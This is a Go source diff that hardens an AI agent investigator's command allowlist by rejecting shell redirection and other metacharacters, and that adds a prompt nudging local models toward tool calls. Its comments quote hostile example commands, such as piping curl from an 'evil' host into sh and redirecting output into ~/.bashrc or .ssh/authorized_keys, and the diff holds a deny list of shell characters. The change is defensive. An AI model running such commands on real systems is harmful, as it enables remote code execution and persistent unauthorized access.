@@ -97,8 +97,10 @@ func (inv *Investigator) SetCommandAllowlist(allowlist []string) {
 
 // isCommandAllowed checks whether a command is permitted by the allowlist.
 // If the allowlist is empty, all commands are allowed for backward compatibility.
-// Commands containing shell chaining operators (;, &&, ||, |, $, `) are always
-// rejected to prevent command injection through prefix matching.
+// Commands containing any shell metacharacter — chaining (;, &, |, $, `),
+// redirection (<, >), or control/escape bytes — are always rejected to prevent
+// injection (and out-of-repo redirection) through prefix matching, since the
+// command is ultimately handed to `sh -c`.
 func (inv *Investigator) isCommandAllowed(command string) bool {
 	trimmed := strings.TrimSpace(command)
 	if trimmed == "" {
@@ -108,14 +110,14 @@ func (inv *Investigator) isCommandAllowed(command string) bool {
 	// Reject shell metacharacters FIRST, before the empty-allowlist
 	// short-circuit. Otherwise a config with an explicitly empty
 	// command_allowlist would allow injection like "ls; curl evil | sh".
-	//
-	// Use the SAME canonical set as the native runtime's run_command guard
-	// (runtime/gemma.go isCommandAllowed) so the two enforcement points can't
-	// drift. The old set only blocked chaining (; && || | $( ` \n) and left
-	// redirection (> <), background (&), bare variable expansion ($HOME), and
-	// \r \t \x00 \ open — so an allowlisted prefix like "cat" or "grep" could
-	// still clobber files outside the repo, e.g. `cat x > ~/.bashrc`.
-	if strings.ContainsAny(trimmed, ";&|$`<>\n\r\t\x00\\") {
+	// This is the same forbidden set enforced by the gemma runtime's
+	// run_command tool (internal/runtime/gemma.go) and the criteria command
+	// evaluator; the investigator must not be a weaker gate. Crucially it
+	// includes redirection (<, >) — a prefix-matched command such as
+	// "cat go.mod > /home/user/.ssh/authorized_keys" otherwise passes and
+	// `sh -c` writes to an absolute path outside cmd.Dir (the repo).
+	const forbidden = ";&|$`<>\n\r\t\x00\\"
+	if strings.ContainsAny(trimmed, forbidden) {
 		return false
 	}
 
@@ -170,12 +172,18 @@ func (inv *Investigator) Investigate(ctx context.Context, repoPath string) (*Inv
 			return nil, fmt.Errorf("investigation LLM call (iteration %d): %w", i+1, err)
 		}
 
-		// No tool calls — append the assistant text and continue the loop
+		// No tool calls — append the assistant text plus a corrective user
+		// nudge, then continue. Without the nudge, small local models keep
+		// chatting in prose until the iteration cap kills the investigation.
 		if len(resp.ToolCalls) == 0 {
 			messages = append(messages, llm.Message{
 				Role:    llm.RoleAssistant,
 				Content: resp.Content,
-			})
+			},
+				llm.Message{
+					Role:    llm.RoleUser,
+					Content: "Respond only with tool calls (read_file, run_command), and call submit_report as soon as you have enough information. Do not reply in prose.",
+				})
 			continue
 		}
 
